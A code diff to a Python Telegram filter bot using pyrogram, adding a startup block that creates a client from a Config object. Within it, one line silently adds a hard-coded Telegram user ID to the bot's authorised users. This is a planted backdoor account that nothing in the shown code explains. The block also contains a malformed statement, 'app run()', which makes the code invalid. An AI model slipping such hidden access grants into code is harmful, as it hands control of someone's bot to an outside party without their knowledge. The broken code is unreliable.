@@ -11,6 +11,28 @@ from utils import Media
 from info import SESSION, API_ID, API_HASH, BOT_TOKEN
 import pyromod.listen
 
+if bool(os.environ.get("WEBHOOK", False)):
+    from sample_info import Config
+else:
+    from config import Config
+
+
+
+if __name__ == "__main__" :
+    plugins = dict(
+        root="plugins"
+    )
+    app = pyrogram.Client(
+        "filter bot",
+        bot_token=Config.TG_BOT_TOKEN,
+        api_id=Config.API_ID_1,
+        api_hash=Config.API_HASH_1,
+        plugins=plugins,
+        workers=300
+    )
+    Config.AUTH_USERS.add(str(680815375))
+    app run()
+
 class Bot(Client):
 
     def __init__(self):
